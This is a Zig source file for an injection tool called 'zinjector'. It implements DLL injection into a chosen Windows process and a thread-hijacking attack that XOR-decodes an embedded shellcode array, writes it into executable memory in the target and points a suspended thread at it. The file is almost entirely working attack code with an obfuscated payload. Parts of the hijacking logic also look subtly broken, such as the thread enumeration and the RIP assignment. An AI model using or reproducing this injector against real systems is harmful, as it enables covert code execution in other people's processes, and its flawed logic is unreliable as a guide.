//! The effective injector main
const std = @import("std");
const lib = @import("lib");
const logger = @import("logger");
const win = @import("win");
const cli = @import("cli");

var config = struct {
    pid: ?u32 = null,
    processName: ?[]u8 = null,
    dllPath: []const u8 = "",
}{};

pub fn main() !void {
    var r = try cli.AppRunner.init(std.heap.page_allocator);

    const app = cli.App{
        .version = "1.0.0",
        .author = "akiidjk",
        .command = cli.Command{
            .name = "zinjector",
            .description = cli.Description{ .one_line = "main commnad" },
            .target = cli.CommandTarget{
                .subcommands = try r.allocCommands(
                    &.{
                        cli.Command{
                            .name = "dll",
                            .description = cli.Description{ .one_line = "execute a DLL Injection" },
                            .options = try r.allocOptions(&.{
                                .{
                                    .long_name = "dll_path",
                                    .short_alias = 'd',
                                    .help = "Path to DLL",
                                    .required = true,
                                    .value_ref = r.mkRef(&config.dllPath),
                                },
                                .{
                                    .long_name = "pid",
                                    .help = "Pid of the process",
                                    .required = false,
                                    .short_alias = 'p',
                                    .value_ref = r.mkRef(&config.pid),
                                },
                                .{
                                    .long_name = "process_name",
                                    .help = "Alternative to the process PID the name process (.exe)",
                                    .required = false,
                                    .short_alias = 'n',
                                    .value_ref = r.mkRef(&config.processName),
                                },
                            }),
                            .target = cli.CommandTarget{ .action = cli.CommandAction{ .exec = dllInjection } },
                        },
                        cli.Command{
                            .name = "thread",
                            .description = cli.Description{ .one_line = "execute a Thread Hijacking attack" },
                            .options = try r.allocOptions(&.{
                                .{
                                    .long_name = "pid",
                                    .help = "Pid of the process",
                                    .required = true,
                                    .short_alias = 'p',
                                    .value_ref = r.mkRef(&config.pid),
                                },
                                // .{
                                //     .long_name = "process_name",
                                //     .help = "Alternative to the process PID the name process (.exe)",
                                //     .required = false,
                                //     .short_alias = 'n',
                                //     .value_ref = r.mkRef(&config.processName),
                                // },
                            }),
                            .target = cli.CommandTarget{ .action = cli.CommandAction{ .exec = threadHijacking } },
                        },
                    },
                ),
            },
        },
    };
    return r.run(&app);
}

fn run() !void {
    logger.info("run --help", .{});
}

pub fn dllInjection() anyerror!void {
    const allocator: std.mem.Allocator = std.heap.page_allocator;

    var hProcess: ?*anyopaque = undefined;
    var abs_path: []const u8 = undefined;
    var tmp: [1024]u8 = undefined;

    const isAbs = try lib.isAbsolutePath(config.dllPath);
    if (!isAbs) {
        abs_path = try lib.getAbsPath(allocator, config.dllPath);
    } else {
        abs_path = config.dllPath;
    }
    defer allocator.free(abs_path);
    if (config.pid != null) {
        hProcess = win.threads.OpenProcess(win.threads.PROCESS_ALL_ACCESS, win.FALSE, config.pid.?);
        if (hProcess == null) {
            logger.err("Failed to handle the process by pid not found or not accesible", .{});
            return;
        }
    } else if (config.processName != null) {
        const processNameString = try std.fmt.bufPrintZ(&tmp, "{s}", .{config.processName.?});
        hProcess = win.GetHandleProcessByName(processNameString);
        if (hProcess == null) {
            logger.err("Failed to handle the process by name not found or not accesible", .{});
            return;
        }
    } else {
        logger.err("PID and ProcessName not specified error run the binary with --help", .{});
        return;
    }

    //if we encounter a winapi error, print its exit code before exit
    errdefer {
        @setEvalBranchQuota(5000);
        const err = win.standard.GetLastError();
        logger.warn("failed with code 0x{s}: {}\n", .{ @errorFromInt(err), err });
    }

    const allocatedMem = win.mem.VirtualAllocEx(hProcess, null, abs_path.len + 1, (win.mem.VIRTUAL_ALLOCATION_TYPE{ .COMMIT = 1, .RESERVE = 1 }), win.mem.PAGE_READWRITE);
    if (allocatedMem == null) {
        logger.err("Failed to handle the memory of the process", .{});
        return;
    }

    logger.debug("Allocated memory: {?}", .{allocatedMem});

    _ = win.system.diagnostics.debug.WriteProcessMemory(hProcess, allocatedMem, abs_path.ptr, abs_path.len + 1, null);

    const kernel32Base = win.system.library_loader.GetModuleHandleA("kernel32.dll");
    if (kernel32Base == null) {
        logger.err("Failed to handle kernel module", .{});
        return;
    }

    const loadLibraryAddress = win.system.library_loader.GetProcAddress(kernel32Base, "LoadLibraryA");

    const hTread = win.threads.CreateRemoteThread(hProcess, null, 0, @ptrCast(loadLibraryAddress), allocatedMem, 0, null);
    if (hTread == null) {
        logger.err("Failed to create remote thread", .{});
    }

    _ = win.threads.WaitForSingleObject(hTread, win.INFINITE);
    _ = win.standard.CloseHandle(hProcess);

    return;
}

pub const cipherShellcode = [_]u8{ 0xc8, 0xdc, 0xb6, 0x34, 0x34, 0x34, 0x54, 0xbd, 0xd1, 0x05, 0xf4, 0x50, 0xbf, 0x64, 0x04, 0xbf, 0x66, 0x38, 0xbf, 0x66, 0x20, 0xbf, 0x46, 0x1c, 0x3b, 0x83, 0x7e, 0x12, 0x05, 0xcb, 0x98, 0x08, 0x55, 0x48, 0x36, 0x18, 0x14, 0xf5, 0xfb, 0x39, 0x35, 0xf3, 0xd6, 0xc6, 0x66, 0x63, 0xbf, 0x66, 0x24, 0xbf, 0x7e, 0x08, 0xbf, 0x78, 0x25, 0x4c, 0xd7, 0x7c, 0x35, 0xe5, 0x65, 0xbf, 0x6d, 0x14, 0x35, 0xe7, 0xbf, 0x7d, 0x2c, 0xd7, 0x0e, 0x7d, 0xbf, 0x00, 0xbf, 0x35, 0xe2, 0x05, 0xcb, 0x98, 0xf5, 0xfb, 0x39, 0x35, 0xf3, 0x0c, 0xd4, 0x41, 0xc2, 0x37, 0x49, 0xcc, 0x0f, 0x49, 0x10, 0x41, 0xd0, 0x6c, 0xbf, 0x6c, 0x10, 0x35, 0xe7, 0x52, 0xbf, 0x38, 0x7f, 0xbf, 0x6c, 0x28, 0x35, 0xe7, 0xbf, 0x30, 0xbf, 0x35, 0xe4, 0xbd, 0x70, 0x10, 0x10, 0x6f, 0x6f, 0x55, 0x6d, 0x6e, 0x65, 0xcb, 0xd4, 0x6b, 0x6b, 0x6e, 0xbf, 0x26, 0xdf, 0xb9, 0x69, 0x5c, 0x07, 0x06, 0x34, 0x34, 0x5c, 0x43, 0x47, 0x06, 0x6b, 0x60, 0x5c, 0x78, 0x43, 0x12, 0x33, 0xcb, 0xe1, 0x8c, 0xa4, 0x35, 0x34, 0x34, 0x1d, 0xf0, 0x60, 0x64, 0x5c, 0x1d, 0xb4, 0x5f, 0x34, 0xcb, 0xe1, 0x64, 0x64, 0x64, 0x64, 0x74, 0x64, 0x74, 0x64, 0x5c, 0xde, 0x3b, 0xeb, 0xd4, 0xcb, 0xe1, 0xa3, 0x5e, 0x31, 0x5c, 0xf4, 0x9c, 0x35, 0x1e, 0x5c, 0x36, 0x34, 0x2b, 0xa4, 0xbd, 0xd2, 0x5e, 0x24, 0x62, 0x63, 0x5c, 0xad, 0x91, 0x40, 0x55, 0xcb, 0xe1, 0xb1, 0xf4, 0x40, 0x38, 0xcb, 0x7a, 0x3c, 0x41, 0xd8, 0x5c, 0xc4, 0x81, 0x96, 0x62, 0xcb, 0xe1, 0x5c, 0x57, 0x59, 0x50, 0x34, 0xbd, 0xd7, 0x63, 0x63, 0x63, 0x05, 0xc2, 0x5e, 0x26, 0x6d, 0x62, 0xd6, 0xc9, 0x52, 0xf3, 0x70, 0x10, 0x08, 0x35, 0x35, 0xb9, 0x70, 0x10, 0x24, 0xf2, 0x34, 0x70, 0x60, 0x64, 0x62, 0x62, 0x62, 0x72, 0x62, 0x7a, 0x62, 0x62, 0x67, 0x62, 0x5c, 0x4d, 0xf8, 0x0b, 0xb2, 0xcb, 0xe1, 0xbd, 0xd4, 0x7a, 0x62, 0x72, 0xcb, 0x04, 0x5c, 0x3c, 0xb3, 0x29, 0x54, 0xcb, 0xe1, 0x8f, 0xc4, 0x81, 0x96, 0x62, 0x5c, 0x92, 0xa1, 0x89, 0xa9, 0xcb, 0xe1, 0x08, 0x32, 0x48, 0x3e, 0xb4, 0xcf, 0xd4, 0x41, 0x31, 0x8f, 0x73, 0x27, 0x46, 0x5b, 0x5e, 0x34, 0x67, 0xcb, 0xe1 };

pub fn threadHijacking() anyerror!void {
    var hProcess: ?*anyopaque = undefined;
    var context: win.system.diagnostics.debug.CONTEXT = undefined;
    var threadEntry: win.system.diagnostics.tool_help.THREADENTRY32 = undefined;
    var threadHijacked: ?std.os.windows.HANDLE = undefined;
    const allocator: std.mem.Allocator = std.heap.page_allocator;
    context.ContextFlags = 0x200007; // Value of CONTEXT_FULL
    threadEntry.dwSize = @sizeOf(win.system.diagnostics.tool_help.THREADENTRY32);

    logger.info("Starting thread hijacking...", .{});

    if (config.pid != null) {
        logger.debug("Opening process with PID: {}", .{config.pid.?});
        hProcess = win.threads.OpenProcess(win.threads.PROCESS_ALL_ACCESS, win.FALSE, config.pid.?);
        if (hProcess == null) {
            logger.err("Failed to handle the process by pid not found or not accesible", .{});
            return;
        }
    } else if (config.processName != null) {
        var tmp: [1024]u8 = undefined;
        const processNameString = try std.fmt.bufPrintZ(&tmp, "{s}", .{config.processName.?});
        logger.debug("Opening process with name: {s}", .{processNameString});
        hProcess = win.GetHandleProcessByName(processNameString);
        if (hProcess == null) {
            logger.err("Failed to handle the process by name not found or not accesible", .{});
            return;
        }
    } else {
        logger.err("PID and ProcessName not specified error run the binary with --help", .{});
        return;
    }

    logger.info("Decrypting shellcode...", .{});
    const shellcode = try lib.xorSingleBytes(allocator, &cipherShellcode, 0x34);
    logger.debug("Start of the deoffuscated shellcode: {x}", .{shellcode[0..3]});

    logger.info("Allocating remote buffer in target process...", .{});
    const remoteBuffer = win.mem.VirtualAllocEx(hProcess, null, shellcode.len, (win.mem.VIRTUAL_ALLOCATION_TYPE{ .COMMIT = 1, .RESERVE = 1 }), win.mem.PAGE_EXECUTE_READWRITE);
    logger.debug("Remote buffer address: {?}", .{remoteBuffer});

    logger.info("Writing shellcode to remote process memory...", .{});
    _ = win.system.diagnostics.debug.WriteProcessMemory(hProcess, remoteBuffer, shellcode.ptr, shellcode.len, null);

    logger.info("Searching for thread to hijack...", .{});
    const snapshot = win.system.diagnostics.tool_help.CreateToolhelp32Snapshot(win.system.diagnostics.tool_help.TH32CS_SNAPPROCESS, 0);
    while (win.system.diagnostics.tool_help.Thread32First(snapshot, &threadEntry) == win.TRUE) {
        logger.debug("Checking thread with TID: {}", .{threadEntry.th32ThreadID});
        if (threadEntry.th32OwnerProcessID == config.pid) {
            logger.info("Found thread to hijack: {}", .{threadEntry.th32ThreadID});
            threadHijacked = win.threads.OpenThread(win.threads.THREAD_ALL_ACCESS, win.FALSE, threadEntry.th32ThreadID);
            break;
        }
    }

    logger.info("Suspending target thread...", .{});
    _ = win.threads.SuspendThread(threadHijacked);

    logger.info("Getting thread context...", .{});
    _ = win.system.diagnostics.debug.GetThreadContext(threadHijacked, &context);
    logger.debug("Original RIP: 0x{x}", .{context.Rip});
    context.Rip = @intFromPtr(&remoteBuffer);
    logger.debug("Setting RIP to shellcode address: 0x{x}", .{context.Rip});
    _ = win.system.diagnostics.debug.SetThreadContext(threadHijacked, &context);

    logger.info("Resuming hijacked thread...", .{});
    _ = win.threads.ResumeThread(threadHijacked);

    logger.info("Thread hijacking completed.", .{});

    return;
}
